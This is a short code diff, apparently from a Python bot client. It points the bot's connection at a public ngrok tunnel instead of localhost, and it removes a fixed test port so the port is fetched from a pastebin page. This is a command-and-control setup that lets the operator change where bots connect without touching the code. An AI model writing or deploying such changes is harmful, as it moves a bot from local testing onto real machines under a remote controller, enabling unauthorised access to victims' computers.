@@ -11,7 +11,7 @@ from time import sleep
 
 
 # CONNECTION INFO
-ip = "127.0.0.1"
+ip = "0.tcp.ngrok.io"
 pastebin = "https://pastebin.com/raw/cvgURkA6"
 
 # BOT SOURCE INFO
@@ -68,7 +68,6 @@ def get_port(pastebin):
     res = urllib.urlopen(pastebin)
     html = res.read()
     port = int(html.decode("utf-8"))
-    port = 8080
   except:
     get_port(pastebin)
 
